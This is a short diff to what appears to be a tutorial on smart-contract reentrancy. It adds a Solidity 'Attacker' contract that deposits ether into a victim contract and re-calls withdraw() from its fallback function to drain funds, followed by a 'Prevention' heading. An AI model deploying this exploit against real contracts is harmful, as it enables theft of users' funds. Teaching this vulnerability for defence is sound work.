@@ -45,7 +45,21 @@ contract Victim {
         balances[msg.sender] = 0;
     }
 }
-Imagine this malicious contract from attackers :
+** Imagine this malicious contract from attackers :
+contract Attacker {
+    function beginAttack() external payable {
+        Victim(VICTIM_ADDRESS).deposit.value(1 ether)();
+        Victim(VICTIM_ADDRESS).withdraw();
+    }
+
+    function() external payable {
+        if (gasleft() > 40000) {
+            Victim(VICTIM_ADDRESS).withdraw();
+        }
+    }
+}
+
+
 
 ** Prevention : 
 
